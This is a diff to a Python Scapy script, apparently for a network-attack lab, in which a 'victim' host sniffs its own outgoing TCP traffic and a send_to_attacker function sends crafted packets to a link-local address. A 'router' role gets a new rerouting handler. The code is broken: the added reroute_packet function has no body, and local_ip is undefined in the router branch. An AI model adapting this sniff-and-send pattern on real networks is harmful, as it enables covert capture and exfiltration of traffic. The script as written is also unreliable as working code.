@@ -16,13 +16,15 @@ def packet_sniffer(my_filter, my_prn):
 def packet_storage(packet):
     packets.append(packet)
 
+def reroute_packet(packet):
+
 def defense_model(packet):
     return 0
 
 def send_to_attacker():
     actual_destination = 'DUP_PL_DEST=169.254.0.7'
     for packet in packets:
-        new_packet = IP()/TCP()/Raw(load=data)
+        new_packet = IP()/TCP()/Raw(load=actual_destination)
         new_packet[IP].dst = '169.254.0.10'
     
         new_packet[TCP].dport = 80
@@ -41,9 +43,9 @@ def print_packets():
 if __name__=='__main__':
     if(role == 'victim'):
         local_ip = get_if_addr('eth1')
-        packet_sniffer('host ' + local_ip + ' and tcp', packet_storage)
+        packet_sniffer('src host ' + local_ip + ' and tcp', packet_storage)
         print_packets()
         send_to_attacker()
     elif(role == 'router'):
-        packet_sniffer('dest ' + local_ip + 'tcp', defense_model)
+        packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
     
